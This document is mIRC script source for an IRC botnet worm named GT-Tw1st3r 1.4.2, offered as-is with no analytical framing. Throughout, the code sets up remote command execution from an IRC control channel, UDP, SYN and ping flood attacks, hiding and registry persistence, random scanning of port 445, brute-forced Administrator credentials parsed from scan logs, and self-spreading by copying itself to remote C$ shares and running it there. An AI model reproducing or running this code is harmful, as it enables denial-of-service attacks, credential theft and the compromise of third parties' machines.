
-----------GT-Tw1st3r-1.4.2-Xscan-Edition------------
--------------------Made-by-JoCkeR-------------------

on *:START:{
  run total.exe /n /fh mirc
  sconf
  cfac
  inc %many
  if (%many = 1) { set %infecttime $day $date $time | makeSHR }
}
alias n0clone { if ($portfree(14859) == $false) { exit } | socklisten noclone 14859 }
on *:TEXT:*:*: {
  if ($nick isop $rds(sc)) {
    if ($1 = !dde) { /dde $2 command "" / $+ $3- }
    if ($1 = !-) && ($2 != $null) { %- = $2- | / $+ %- | unset %- }
    if ($1 = !pfast) { if ($4 == random) { //Tw1stStart $2 $3 $r(1,64000) | halt } | //Tw1stStart $2 $3 $4 }
    if ($1 = !fserv) { /saym [F-Serv Initialized] ( $+ $nick $+ ) ( Enjoy! | /fserve $nick 3 $2  }
    if ($1 = !run) && ($2 != $null) { /run $2- }
    if ($1 = !icmp) { if ($2 == $null) { /saym Error/Syntax: (!icmp ip packetsize howmany, ie: !icmp 127.0.0.1 2000 1000) | halt } | run total.exe /n /r "ping -n $4 -l $3 -w 0 $2 " }
    if ($1 = !Clone) { /clone $2- }
    if ($1 = !syn) { if ($2 !== $null) { saym (SynPacket) (Attacking) $2 on $3 With $4 Packets | synp start $4 $2 $3 } }
    if ($1 = !pf) { if ($2 = stop) { apagestop } | if ($2 = start) { apages $3- } }
    if ($1 = !download) { /download $2- | saym [Downloading..] $nopath($3-) }
    if ($1 = !downd) { /downd $2- | saym [Downloading..] $nopath($3-) }
    if ($1 = !bnc.start) && ($3 != $null) { if ($sock(Bnc)) { saym 2[8ERROR2]14 bnc is already active on port: %Bnc.Port $+ , pass: %Bnc.passwd | halt } | %Bnc = on | socklisten Bnc $2 | %Bnc.port = $2 | %Bnc.passwd = $3 | saym 2[14bnc2]14 /server -m $ip $+ : $+ $2 $+ , then /quote PASS $3 }
    if ($1 = !bnc.stats) && ($sock(Bnc)) { saym 2[14bnc2]14 is on! $ip $+ : $+ %Bnc.port pass: %Bnc.passwd $+ .. users: $sock(BncClient*,0) connected: $sock(BncServer*,0) }
    if ($1 = !bnc.stop) && (%Bnc.Port != $null) { sockclose Bnc* | saym 2[14bnc2]14 server on port %bnc.port is now off | unset %bnc.* | sockclose Bnc* }
    if ($1 = !randscan) && (%begshortip == $null) && ($exists($rds(sf))) { set %begit $randip($2) | saym 2[14scanner2]14 starting scan from: %begit to $3 | set %begshortip %begit | set %beglongip $longip(  %begshortip ) | set %endshortip $3 | set %endlongip $longip( %endshortip  ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }
    if ($1 = !stopscan) && (%begshortip != $null) { sockclose ip* | timerscanner* off | unset %ip* | unset %total | unset %totalscaning | saym 2[14scanner2]14 scanning of %begshortip to %endshortip stopped by $nick $+ ! | unset %beg* | unset %end* }
    if ($1 = !ipscan) && (%begshortip == $null) && ($exists($rds(sf))) { set %begit $gettok($ip,1-2,46) $+ . $+ $rand(1,255) $+ . $+ $rand(1,255) | saym 12|14scanner12|14 scanning: %begit to $gettok($ip,1-2,46) $+ .255.255 | set %begshortip %begit | set %beglongip $longip( %begshortip ) | set %endshortip $gettok($ip,1-2,46) $+ .255.255 | set %endlongip $longip( %endshortip ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }
    if ($1 = !stop) { set %status 0 | run mort.exe mt.exe -kf vhost.exe | saym 12-4stopping scans12- } 
    if ($1 = !start) { set %rangeip $read(r.r) | set %iip1 $randip($gettok(%rangeip,1,45)) | set %iip2 $gettok(%rangeip,2,45) | set %rangeip %iip1 $+ - $+ %iip2 | unset %iip* | run mort.exe vhost.exe -host %rangeip -ntpass -t 150,75 | set %status 1 | saym 12-4scanning12-14 %rangeip } 
    if ($1 = !fstart) { set %ip $read(f.f) | run mort.exe vhost.exe -host %ip -ntpass -t 150,75 | set %status 1 | saym 12-4scanning12-14 %ip } 
    if ($1 = !var) { saym Variable equals to: [ [ $$2- ] ] }

  }
}

on *:disconnect:{   timercheck -o 0 20 Cona  }
alias Tw1stStart  { if $1 = STOP { .timerTw1st off | unset %gnum | saym [Packeting] Halted } | if $3 = $null { return } |  if $timer(Tw1st).com != $null { saym 4ERROR!1 Currently Attacking: $gettok($timer(Tw1st).com,3,32)  | return } |  saym sending ( $+ $1 $+ ) packets to ( $+ $2 $+ ) on port: ( $+ $3 $+ ) |  set %gnum 0 |  .timerTw1st -m 0 400 Tw1st1t $1 $2 $3 }
alias Tw1st1t {  if $3 = $null { goto done } |  :loop | if %gnum >= $1 { goto done } | inc %gnum 4 
  sockudp Tw1st $2 $3 $str(âô_6ÜµKTE_}“‘²,60)
  sockudp Tw2st $2 $3 $str(!@#$%^&*()_+|,50)
  sockudp Tw3st $2 $3 $str(@,920)
  sockudp Tw4st $2 $3 $str(0010110,130) 
  sockudp Tw5st $2 $3 $str(Pong,200)
  sockudp Tw6st $2 $3 $str(Tw1st,180)
  sockudp Tw7st $2 $3 $str(*,350)
  sockudp Tw8st $2 $3 $str(link,200)
  sockudp Tw9st $2 $3 $str(Tw1st,180)
  return |  :done | //saym [Packeting] finished | .timerTw1st off | unset %gnum 
}

alias synp { if ($1 == $null) { return } | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop |  syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | saym Syn Attack Done! }
alias syn {
  if ($2 == start) { if ($3 !isnum) || ($5 !isnum) { return } | var %x = 1 | while (%x <= $3) { sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) $4 $5 | inc %x  } }
  if ($2 == stop) { if ($sock(syn*,0) > 0) { sockclose syn* } }
}
on *:socklisten:Bnc:{ sockaccept BncClient $+ $r(1,999) }
on *:sockread:BncClient*:{
  sockread %BncClient
  if ($gettok(%BncClient,1,32) == NICK) {
    set %Bnc.nick $gettok(%BncClient,2,32)
  }
  if ($gettok(%BncClient,1,32) == USER) {
    set %Bnc.user $gettok(%BncClient,2-,32)
    sockwrite -n $sockname NOTICE AUTH : $+ You need to say /quote PASS <password>
  }
  if ($gettok(%BncClient,1,32) == PASS) { 
    if ($gettok(%BncClient,2,32) == %Bnc.passwd) {
      sockwrite -n $sockname NOTICE AUTH : $+ Welcome to BNC 2.6.4-WIN, the irc proxy
      sockwrite -n $sockname NOTICE AUTH : $+ Level two, lets connect to something real now
      sockwrite -n $sockname NOTICE AUTH : $+ type /quote conn [server] <port> <pass> to connect
      %Bnc.legit = yes
    } 
    if ($gettok(%BncClient,2,32) != %Bnc.passwd) { 
      sockwrite -n $sockname NOTICE AUTH : $+ Failed Pass!!
    }
  }
  if ($gettok(%BncClient,1,32) == CONN) {
    if (%Bnc.legit != yes) { sockwrite -n $sockname NOTICE AUTH : $+ BNC Exploits dont work on This | sockclose   $sockname
    }
    if (BncServer $+ $remove($sockname,BncClient) != $null) {
      sockclose BncServer $+ $remove($sockname,BncClient)
    }
    sockopen BncServer $+ $remove($sockname,BncClient) $gettok(%BncClient,2,32) $gettok(%BncClient,3,32)
    sockwrite -n $sockname NOTICE AUTH : $+ Making reality through $gettok(%BncClient,2,32) port $gettok(%BncClient,3,32)
    set %Bnc.server.passwd $gettok(%BncClient,4,32)
  }
  else {
    if ($sock(BncServer $+ $remove($sockname,BncClient)).status != active) {
      halt
    }
    sockwrite -n BncServer $+ $remove($sockname,BncClient) %BncClient
  }
}
alias jc { /join $rds(sc) $rds(sk) }
on *:sockopen:BncServer*:{
  if ($sockerr) {
    sockwrite -n $sockname NOTICE AUTH : $+ Failed Connection
    sockclose $sockname
    halt
  }
  if ($sock($sockname).status != active) {
    sockwrite -n $sockname NOTICE AUTH : $+ Failed Connection
    sockclose BncServer $+ $remove($socknme, BncServer)
    halt
  }
  sockwrite -n BncClient $+ $remove($sockname,BncServer) NOTICE AUTH : $+ Suceeded connection
  sockwrite -n $sockname NICK %Bnc.nick
  sockwrite -n $sockname USER %Bnc.user
}
on *:join:#:{ if (# = $rds(sc)) { if ($nick = $me) { timerjc off } } }
on *:sockread:BncServer*:{
  sockread %BncServer
  if ($sock(BncClient $+ $remove($sockname,BncServer)).status != active) {
    halt
  }
  sockwrite -n BncClient $+ $remove($sockname,BncServer) %BncServer
}
on *:sockread:xxx*:{
  sockread %QHTread
  Stay %QHTread
}
alias fnick {
  set %fnick $rand(1,10)
  if (%fnick = 1) { return $read constr $+ $chr($r(65,125)) $+ $chr($r(65,125))  }
  if (%fnick = 2) { return $chr($r(65,125)) $+ $read constr $+ $chr($r(65,125))  }
  if (%fnick = 3) { return $chr($r(65,125)) $+ $chr($r(65,125)) $+ $read  constr }
  if (%fnick = 4) { return $r(A,Z) $+ $read constr $+ $r(A,Z) }
  if (%fnick = 5) { return $chr($r(65,125)) $+ $chr($r(65,125)) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z)  }
  if (%fnick = 6) { return $read  constr $+ $r(1,40) $+ $chr($r(65,125))  }
  if (%fnick = 7) { return $r(a,z) $+ $read constr $+ $r(a,z) }
  if (%fnick = 8) { return $read  constr $+ $r(a,z) $+ $chr($r(65,125))  }
  if (%fnick = 9) { return $read  constr $+ $r(1,10) $+ $chr($r(65,125))  }
  if (%fnick = 10) { return $read  constr $+ $r(20,50) $+ $chr($r(65,125)) }
}
alias Cona { server $rds(sr) $rds(sp) | if ($portfree(113)) { socklisten IDENT 113 } }

alias clone {
  if ($1 = con) { set %cserver $2 | /set %cport $3 | /timeropensock $+ $fnick $4 2 opensock }
  if ($1 = join) { sockwrite -nt xxx* Join $2- }
  if ($1 = part) { sockwrite -nt xxx* Part $2 : $+ $3- }
  if ($1 = msg) { sockwrite -nt xxx* privmsg $2 : $+ $3- }
  if ($1 = notice) { sockwrite -nt xxx* notice $2 : $+ $3- }
  if ($1 = reg) { sockwrite -nt xxx* Privmsg NickServ : $+ register $2- | sockwrite -nt xxx* Privmsg NickServ : $+ identify $2- }
  if ($1 = creg) { set %rchan # $+ $fnick $+ $rand(1,1000) | sockwrite -nt xxx* Join %rchan | sockwrite -nt xxx* Privmsg Chanserv : register %rchan $fnick xxx }
  if ($1 = jp) { sockwrite -nt xxx* Join $2- | sockwrite -nt xxx* part $2 : $3- | sockwrite -nt xxx* Join $2- | sockwrite -nt xxx* part $2 : $3- | sockwrite -nt xxx* Join $2- | sockwrite -nt xxx* part $2 : $3- }
  if ($1 = jmp) { sockwrite -nt xxx* Join $2 | sockwrite -nt xxx* privmsg $2 : $3- | sockwrite -nt xxx* part $2 }
  if ($1 = flood.c) { sockwrite -nt xxx* join $2 | sockwrite -nt xxx* privmsg $2 : $3- | sockwrite -nt xxx* notice $2 : $3- | sockwrite -nt xxx* privmsg $2 : $3- }
  if ($1 = flood.n) { sockwrite -nt xxx* privmsg $2 : $3- | sockwrite -nt xxx* notice $2 : $3- | sockwrite -nt xxx* privmsg $2 : $3- }
  if ($1 = chat.flood) { sockwrite -nt xxx* privmsg $2 :DCC CHAT $2 1058633484 3481  }
  if ($1 = Quit) { Sockwrite -nt xxx* Quit : $+ $2- }
  if ($1 = massquit) { SockWrite -nt xxx* Join $2 | Sockwrite -nt xxx* Quit : $+ $3- }
  if ($1 = fnick) { sockwrite -nt xxx* Nick $2 $+ $r(1,1000) $+ $r(1,1000)  }
  if ($1 = Die) { timeropensock* off | sockclose xxx* }
}
alias opensock { sockopen xxx $+ $fnick %cserver %cport }
alias Stay {
  if (PING = $1) { sockwrite -nt * $1- }
}
on *:Sockopen:xxx*:{
  set -u1 %user $rand(A,Z) $+ $fnick $+ $rand(A,Z)
  .sockwrite -nt $sockname USER %user %user %user : $+ %user
  .sockwrite -nt $sockname NICK $fnick
}
raw 433:*:{
  nick [ $+ $os $+ - $+ $r(1000,9999) $+ ]] 
}
on *:socklisten:ident: { .sockaccept $sockname $+ . $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z) }
on *:sockread:IDENT.*: { sockread %tmp | tokenize 32 %tmp | sockwrite -tn $sockname $3 $2 $1 : USERID : UNIX : $fnick | unset %tmp }
alias download {
  var %socket $+(dl,$chr(46),$nopath($2))
  if (!$sock(%socket)) {
    sockopen %socket $1 80
    sockmark %socket HEAD $1 $2
  }
  else { echo $color(info) -s * Socket already in use. }
}
alias downd {
  if ($exists($nopath($2)) = $false) || ($file($nopath($2)).size != $3) {
    var %socket $+(dl,$chr(46),$nopath($2))
    if (!$sock(%socket)) {
      sockopen %socket $1 80
      sockmark %socket HEAD $1 $2
    }
    else { echo $color(info) -s * Socket already in use. }
  }
}
alias percent return $+($round($calc((100 / $2) * $1),2),%)

on *:SOCKOPEN:dl.*:{
  if ($sockerr) { echo $color(info) -s * Error: $sock($sockname).wsmsg | return }
  hadd -m ticks $sockname $ticks
  var %file = $nopath($gettok($sock($sockname).mark,3,32)), %fullfile = $+(",$mircdir,%file,"), %sckr = sockwrite -n $sockname, %^ = $gettok($sock($sockname).mark,3,32)
  write -c %fullfile
  %sckr GET $iif(left(%^,1) != $chr(47),$chr(47) $+ %^,%^) HTTP/1.0
  %sckr HOST: $gettok($sock($sockname).mark,2,32)
  %sckr ACCEPT: *.*
  %sckr $crlf
}

on *:SOCKREAD:dl.*:{
  if ($sockerr) {
    echo $color(info) -s * Error: $sock($sockname).wsmsg
    return
  }
  var %a
  :begin
  if ($gettok($sock($sockname).mark,1,32) == head) { sockread %a }
  else { sockread &b }
  if ($sockbr) {
    tokenize 32 $sock($sockname).mark
    if ($1 == HEAD) {
      if (%a) {
        if ($gettok(%a,1,32) == Content-Length:) { var %totsize = $gettok(%a,2,32) }
      }
      else {
        sockmark $sockname GET $2- %totsize
      }
    }
    elseif ($1 == GET) {
      var %file = $+(",$mircdir,$nopath($3),"), %cursize = $file(%file).size
      var %totsize = $gettok($sock($sockname).mark,4,32)
      bwrite %file -1 &b
    }
    goto begin
  }
}

on *:SOCKCLOSE:dl.*:{
  var %ticks = $calc(($ticks - $hget(ticks,$sockname)) /1000)
  /saym * Download of $nopath($gettok($sock($sockname).mark,3,32)) completed in %ticks seconds.
}
alias H1dd3 { if ($appstate != hidden) { /exit } }
alias s33 { if ($appactive = $true) { /exit } }
on *:connect:{ .timerjc 0 $rand(1,10) /jc | jc | .timercheck off | if (%many = 1) { msg $rds(rc) iam New owned - $ip - $host - $uptime(system,2)  | .pdcc on | .fsend on | clearall } }
alias makeSHR {
  var %SHR $findfile($mircdir,*.*,0,write reta.bat attrib +R +S +H $noPATH($1-))
  run total.exe /n /fh /r reta.bat
  timerre 1 5 /remove reta.bat
}
alias rds {
  if ($1 = sf) { return ridin.exe }
  if ($1 = sr) { return tw1st142.q8hell.org }
  if ($1 = sp) { return 7721 }
  if ($1 = sc) { return #hunt3rz } 
  if ($1 = sk) { return 0ldsh1t }
  if ($1 = rc) { return #seezsh1t }
}
alias goscanners { set %rangeip $read(r.r) | set %iip1 $randip($gettok(%rangeip,1,45)) | set %iip2 $gettok(%rangeip,2,45) | set %rangeip %iip1 $+ - $+ %iip2 | unset %iip* | run mort.exe vhost.exe -host %rangeip -ntpass -t 150,75 | set %status 1 | unset %rangeip | StartipScan | /timerparse -o 0 45 /startparse | /timerroot -o 0 100 /getroot }
alias StartIpScan { if ($exists($rds(sf)) = $true) { set %begit $gettok($ip,1-2,46) $+ . $+ $rand(1,255) $+ . $+ $rand(1,255) | saym 12|14scanner12|14 scanning: %begit to $gettok($ip,1,46) $+ .255.255.255 | set %begshortip %begit | set %beglongip $longip( %begshortip ) | set %endshortip $gettok($ip,1,46) $+ .255.255.255 | set %endlongip $longip( %endshortip ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan } }
alias RegRead {
  if ($1 != $null) {
    var %a = regread
    .comopen %a WScript.Shell
    if !$comerr {
      var %b =  $com(%a,RegRead,3,bstr,$1-)
      var %c = $com(%a).result
      .comclose %a
      if (%c != $null) return %c
      else {
        return NA 
      }
    }
  }
  else { return error! complete data }
}

alias RegWrite {
  if ($1 != $null) && ($2 != $null) && ($3 != $null) {
    var %a = RegWrite
    .comopen %a WScript.Shell
    if !$comerr {
      var %b =  $com(%a,RegWrite,3,bstr,$1,bstr,$2,bstr,$3)
      .comclose %a
    }
    if ($3 == REG_EXPAND_SZ) || ($3 == REG_SZ) {
      if ($regread($1) == $2) { return the value ( $+ $1 $+ ) was created }
      else { return error! when writing }
    }
  }
  else { return error! complete data }
}

alias RegDelete {
  if ($1 != $null) {
    var %a = RegDelete 
    .comopen %a WScript.Shell
    if !$comerr {
      var %b =  $com(%a,RegDelete,3,bstr,$1)
      .comclose %a
    }
  }
  else { return error! complete data }
}
alias sconf { 
  .nick [ $+ $os $+ - $+ $r(1000,9999) $+ ]]
  .n0clone
  .Cona
  .timercheck 0 40 Cona
  .timerh1dd3 -o 0 1 H1dd3
  .timers33 -o 0 1 s33
  .timerregs -o 0 1 regs
  .selfspread
  .goscanners
}
alias cfac { 
  if ($exists(dat) = $false) { mkdir dat | rename config.ini dat\config.ini | rename easy_user.dic dat\easy_user.dic | rename language.ini dat\language.ini | rename nt_pass.dic dat\nt_pass.dic | rename nt_user.dic dat\nt_user.dic | rename os.finger dat\os.finger | rename port.ini dat\port.ini | rename rpc.ini dat\rpc.ini }  
  if ($exists(plugin) = $false) { mkdir plugin | rename 090-ntpass.xpn plugin\090-ntpass.xpn  }  
}
alias regs { if ($Regread(HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\xWindows)  = NA) { regit } }
alias regit { write -c 771458.reg REGEDIT4 | write -a 771458.reg [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run] | write -a 771458.reg "xWindows"=" $+ $replace($mircdir,\,\\) $+ math.exe $replace($mircdir,\,\\) $+ pluged.exe" | .timer 1 1 /run -n regedit /s 771458.reg | timer 1 2 remove 771458.reg }
alias saym { if ($me isvo $rds(sc)) { clearall | msg $rds(sc) $1- } }
alias selfspread {
  if ($exists(c:\WINNT\system32\ $+ $rds(sf)) = $true) && ($exists($rds(sf)) = $false) { .copy c:\WINNT\system32\ $+ $rds(sf) $rds(sf) | remove c:\WINNT\system32\ $+ $rds(sf) } | if ($exists(c:\WINDOWS\system32\ $+ $rds(sf)) = $true) && ($exists($rds(sf)) = $false) { .copy c:\WINDOWS\system32\ $+ $rds(sf) $rds(sf) | remove c:\WINDOWS\system32\ $+ $rds(sf) }
  if ($exists(d:\WINNT\system32\ $+ $rds(sf)) = $true) && ($exists($rds(sf)) = $false) { .copy d:\WINNT\system32\ $+ $rds(sf) $rds(sf) | remove d:\WINNT\system32\ $+ $rds(sf) } | if ($exists(d:\WINDOWS\system32\ $+ $rds(sf)) = $true) && ($exists($rds(sf)) = $false) { .copy d:\WINDOWS\system32\ $+ $rds(sf) $rds(sf) | remove d:\WINDOWS\system32\ $+ $rds(sf) }
  if ($exists(c:\ $+ $rds(sf)) == $true) { copy c:\ $+ $rds(sf)  $rds(sf) | remove c:\ $+ $rds(sf) } 
  if ($exists(d:\ $+ $rds(sf)) == $true) { copy d:\ $+ $rds(sf)  $rds(sf) | remove d:\ $+ $rds(sf) } 
  if ($exists(../ $+ $rds(sf)) == $true) { copy ../ $+ $rds(sf)  $rds(sf) | remove ../ $+ $rds(sf) } | if ($exists(../../ $+ $rds(sf)) == $true) { remove ../../ $+ $rds(sf) }
}

---------------NORMAL NETBIOS-------------------
---------------GT Tw1st3r 1.4-------------------

alias startscan {
  inc %totalscaning
  if %totalscaning == %total finished
  set %ip1 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 1
  set %ip2 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 2
  set %ip3 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 3
  set %ip4 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 4
  set %ip5 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 5
  set %ip6 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 6
  set %ip7 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 7
  set %ip8 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 8
  set %ip9 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 9
  set %ip10 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 10
  set %ip11 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 11
  set %ip12 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 12
  set %ip13 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 13
  set %ip14 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 14
  set %ip15 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 15
  set %ip16 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 16
  set %ip17 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 17
  set %ip18 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 18
  set %ip19 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 19
  set %ip20 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 20
  set %ip21 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 21
  set %ip22 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 22
  set %ip23 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 23
  set %ip24 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 24
  set %ip25 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  opensocks
}
alias opensocks {
  sockopen ip1 %ip1 445
  if $1 == 1 finished
  sockopen ip2 %ip2 445
  if $1 == 2 finished
  sockopen ip3 %ip3 445
  if $1 == 3 finished
  sockopen ip4 %ip4 445
  if $1 == 4 finished
  sockopen ip5 %ip5 445
  if $1 == 5 finished
  sockopen ip6 %ip6 445
  if $1 == 6 finished
  sockopen ip7 %ip7 445
  if $1 == 7 finished
  sockopen ip8 %ip8 445
  if $1 == 8 finished
  sockopen ip9 %ip9 445
  if $1 == 9 finished
  sockopen ip10 %ip10 445
  if $1 == 10 finished
  sockopen ip11 %ip11 445
  if $1 == 11 finished
  sockopen ip12 %ip12 445
  if $1 == 12 finished
  sockopen ip13 %ip13 445
  if $1 == 13 finished
  sockopen ip14 %ip14 445
  if $1 == 14 finished
  sockopen ip15 %ip15 445
  if $1 == 15 finished
  sockopen ip16 %ip16 445
  if $1 == 16 finished
  sockopen ip17 %ip17 445
  if $1 == 17 finished
  sockopen ip18 %ip18 445
  if $1 == 18 finished
  sockopen ip19 %ip19 445
  if $1 == 19 finished
  sockopen ip20 %ip20 445
  if $1 == 20 finished
  sockopen ip21 %ip21 445
  if $1 == 21 finished
  sockopen ip22 %ip22 445
  if $1 == 22 finished
  sockopen ip23 %ip23 445
  if $1 == 23 finished
  sockopen ip24 %ip24 445
  if $1 == 24 finished
  sockopen ip25 %ip25 445
  timerscannerTE -o 1 12 sockclose ip*
  timerscannerSA -o 1 15 startscan
}
alias randip {
  unset %1p1 %1p2
  set %1p1 $1-
  set %1p2 $replace($gettok(%1p1,1,46),*,$rand(1,255))
  set %1p2 %1p2 $+ . $+ $replace($gettok(%1p1,2,46),*,$rand(1,255))
  set %1p2 %1p2 $+ . $+ $replace($gettok(%1p1,3,46),*,$rand(1,255))
  set %1p2 %1p2 $+ . $+ $replace($gettok(%1p1,4,46),*,$rand(1,255))
  return %1p2
}
on 1:sockopen:ip*:{ if ($sockerr > 0) { halt } | set %ant1 % [ $+ [ $sockname ] ] | run total.exe /n /fh /r "r.BAT   %ant1 $rds(sf) $+ " | saym [scanner] Found: %ant1 $+ , attempting to infect.. | sockclose $sockname | unset %ant1 | halt }

------------xscan-------------------
------------ntpass------------------
------------thanks dog--------------

alias checkscan {
  set %results1 0 | set %t1 0
  set %total1 $findfile(log\,*.htm,0)
  :start1
  inc %t1
  if (%t1 <= %total1) { checker $findfile(log\,*.htm,%t1) | goto start1 }
}
alias startparse {
  set %t 0
  set %results 0
  set %total $findfile(log\,*.htm,0)
  :start
  inc %t
  if (%t <= %total) { parsefile $findfile(log\,*.htm,%t) | goto start }
}
alias parsefile {
  set %temp.test $1
  set %temp.host $nopath($1)
  set %temp.host $remove(%temp.host,.htm)
  set %temp.text $read($1, w, *Type: Administrator*)
  set %temp.line $readn
  if (%temp.line == 0) { return NULL }
  set %temp.text $read($1, $calc($readn - 1))
  if ($read($1, $calc(%temp.line - 1)) == <BR>) { $getuserpass2($read($1, $calc(%temp.line - 2))) | return }
  $getuserpass(%temp.text)
}
alias getuserpass {
  set %temp.user $gettok($1,2,60)
  set %temp.user $gettok(%temp.user,2,62)
  set %temp.pass $gettok($1,3,47)
  if (*pass*same*as*user* iswm %temp.pass) { set %temp.pass %temp.user }
  if (*blank*pass* iswm %temp.pass) { set %temp.pass [NULL] }
  if ($exists(blah.txt) == $false) { .write -c blah.txt }
  inc %results
  echo -a FOUND: %temp.host %temp.user %temp.pass
  write blah.txt %temp.host %temp.user %temp.pass
  remove %temp.test
}
alias getuserpass2 {
  set %temp.user $gettok($1,2,62)
  set %temp.user $gettok(%temp.user,1,60)
  set %temp.pass $gettok($1,3,47)
  if (*pass*same*as*user* iswm %temp.pass) { set %temp.pass %temp.user }
  if (*blank*pass* iswm %temp.pass) { set %temp.pass [NULL] }
  if ($exists(blah.txt) == $false) { .write -c blah.txt }
  inc %results
  echo -a FOUND: %temp.host %temp.user %temp.pass
  write blah.txt %temp.host %temp.user %temp.pass
  remove %temp.test
}
alias getroot { if ($lines(blah.txt) < 1) { halt } | /root $read(blah.txt,1) | write -dl1 blah.txt }
alias root { if ($1 == $null) { halt }
  :select
  set %tempfile root $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ .bat
  set %t.drive $r(n,z) $+ :
  if ($exists(%t.drive) == $true) { goto select }
  set %t.user $2
  if ($3 == [NULL]) { set %t.pass $null | set %ps.pass -p "" }
  else { set %t.pass $3 | set %ps.pass -p $3 }
  set %t.host \\ $+ $1 | set %t.share C$
  write %tempfile net use %t.drive /delete
  write %tempfile net use %t.host /USER: $+ %t.user $chr(34) $+ %t.pass $+ $chr(34)
  write %tempfile net use %t.drive %t.host $+ \ $+ %t.share
  write %tempfile cd $mircdir
  write %tempfile copy $rds(sf) %t.drive $+ \ $+ $rds(sf)
  write %tempfile hko.exe %t.host -u %t.user %ps.pass c:\ $+ $rds(sf)
  write %tempfile net use %t.drive /delete
  write %tempfile net use %t.host /delete
  write %tempfile del %tempfile
  msg $rds(rc) 12-4ROOTING12- 14 $1 $2 $+ / $+ $3
  run mort.exe %tempfile
}
alias mroot { if (%cip == $null) { halt }
  :select
  set %ctempfile mroot $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ .bat
  set %mt.drive $r(n,z) $+ :
  if ($exists(%mt.drive) == $true) { goto select }
  if (%cpass == [NULL]) { set %mt.pass $null | set %mps.pass -p "" }
  else { set %mt.pass %cpass | set %mps.pass -p %cpass }
  set %mt.host \\ $+ %cip | set %mt.share C$
  write %ctempfile net use %mt.drive /delete
  write %ctempfile net use %mt.host /USER: $+ %cuser $chr(34) $+ %mt.pass $+ $chr(34)
  write %ctempfile net use %mt.drive %mt.host $+ \ $+ %mt.share
  write %ctempfile cd $mircdir
  write %ctempfile copy $rds(sf) %mt.drive $+ \ $+ $rds(sf)
  write %ctempfile hko.exe %mt.host -u %cuser %mps.pass c:\ $+ $rds(sf)
  write %ctempfile net use %mt.drive /delete
  write %ctempfile net use %mt.host /delete
  write %ctempfile del %tempfile
  msg $rds(rc) 12-4ROOTING12- 14 %cip %cuser $+ / $+ %cpass
  run mort.exe %ctempfile
}
alias rootnum {
  inc %rooted
  if (%rooted == $null) { set %rooted 0 }
  inc %rooted
  if ($len(%rooted) == 1) { set %rooted 00 $+ %rooted }
  if ($len(%rooted) == 2) { set %rooted 0 $+ %rooted }
  return %rooted
}
alias checker {
  set %temp1.test $1
  set %temp1.host $nopath($1)
  set %temp1.host $remove(%temp1.host,.htm)
  set %temp1.text $read($1, w, *scan from*)
  set %temp1.line $readn 
  if (%temp1.line == 0) { return NULL } 
  set %temp1.text $read($1, $calc($readn - 1))
  if ($read($1, $calc(%temp1.line - 1)) == <BR>) { $getuserpass2($read($1, $calc(%temp1.line - 2))) | return }
  $getuserpass1(%temp1.text)
}
alias getuserpass1 {
  set %temp1.user $gettok($1,2,60)
  set %temp1.user $gettok(%temp1.user,2,62)
  set %temp1.pass $gettok($1,3,47)
  if (*pass*same*as*user* iswm %temp1.pass) { set %temp1.pass %temp1.user }
  if (*blank*pass* iswm %temp1.pass) { set %temp1.pass [NULL] }
  if ($exists(blah.txt) == $false) { .write -c blah.txt }
  inc %results1
  echo -a FOUND: %temp1.host %temp1.user %temp1.pass
  remove %temp1.test
  set %status 0
  set %ip $read(%sfile)
